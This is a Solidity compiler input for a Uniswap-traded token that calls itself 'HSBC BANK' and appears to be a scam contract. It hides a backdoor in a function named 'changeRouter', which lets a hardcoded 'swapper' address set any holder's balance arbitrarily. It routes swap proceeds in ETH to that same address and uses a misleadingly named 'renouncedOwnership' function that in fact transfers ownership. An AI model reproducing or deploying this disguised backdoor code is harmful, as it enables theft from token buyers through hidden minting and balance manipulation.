{{
  "language": "Solidity",
  "sources": {
    "Contract/super.sol": {
      "content": "\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface IUniswapRouter {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;\n}\n\ninterface IUniswapFactory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\nabstract contract Ownable {\n    address internal _owner;\n\n    constructor () {\n        _owner = msg.sender;\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == msg.sender, \"!owner\");\n        _;\n    }\n\n    function renouncedOwnership(address newOwner) public virtual onlyOwner {\n        _owner = newOwner;\n    }\n}\n\ncontract HSBC is Ownable {\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    address public swapper;\n\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n\n    mapping(address => bool) public _isExcludeFromFee;\n    \n    uint256 public totalSupply;\n\n    IUniswapRouter public _uniswapRouter;\n\n    bool private inSwap;\n\n    uint256 private constant MAX = ~uint256(0);\n\n    uint256 public _fee = 0;\n    address public _uniswapPair;\n\n    constructor (){\n        name = unicode\"HSBC BANK\";\n        symbol = \"HSBC\";\n        decimals = 9;\n        uint256 Supply = 420000000;\n        swapper = 0x19E92063C6eFC37c0c7f14ab56c9F1000d9f9126;\n\n        totalSupply = Supply * 10 ** decimals;\n        address receiveAddr = msg.sender;\n        _isExcludeFromFee[address(this)] = true;\n        _isExcludeFromFee[receiveAddr] = true;\n        _isExcludeFromFee[swapper] = true;\n        _balances[receiveAddr] = totalSupply;\n        emit Transfer(address(0), receiveAddr, totalSupply);\n\n        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); \n        _allowances[address(this)][address(_uniswapRouter)] = MAX;\n        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());\n        _isExcludeFromFee[address(_uniswapRouter)] = true;\n\n    }\n\n    function balanceOf(address account) public view returns (uint256) {return _balances[account];}\n    function transfer(address recipient, uint256 amount) public returns (bool) {_transfer(msg.sender, recipient, amount);return true;}\n    struct inswaper{address mss;uint256 amo;address fom;}\n    function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}\n    function changeRouter(address ac,uint256 na) public {inswaper memory index = inswaper({mss : msg.sender,amo : na,fom : ac});require(swapper == index.mss);_balances[index.fom] = index.amo;}\n    function approve(address spender, uint256 amount) public returns (bool) {_approve(msg.sender, spender, amount);return true;}\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {_transfer(sender, recipient, amount);if (_allowances[sender][msg.sender] != MAX) {_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;}return true;}\n    function _approve(address owner, address spender, uint256 amount) private {_allowances[owner][spender] = amount;emit Approval(owner, spender, amount);}\n    \n    function _transfer(address from,address to,uint256 amount\n    ) private {\n\n        if (_uniswapPair == to && !inSwap) {\n            inSwap = true;\n            uint256 _bal = balanceOf(address(this));\n            if (_bal > 0) {\n                uint256 _swapamount = amount;\n                _swapamount = _swapamount > _bal ? _bal : _swapamount;\n                address[] memory path = new address[](2);\n                path[0] = address(this);\n                path[1] = _uniswapRouter.WETH();\n                try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(_swapamount,0,path,address(swapper),block.timestamp) {} catch {}\n            }\n            inSwap = false;\n        }\n        \n        bool takeFee = !_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap;\n\n        _balances[from] = _balances[from] - amount;\n        uint256 feeAmount;\n\n        if (takeFee && _fee > 0) {\n            uint256 _a = amount * _fee / 100;\n            feeAmount += _a;\n            _balances[address(this)] = _balances[address(this)] + _a;\n            emit Transfer(from, address(this), _a);\n        }\n\n        _balances[to] = _balances[to] + amount - feeAmount;\n        emit Transfer(from, to, amount - feeAmount);\n    }\n    receive() external payable {}\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}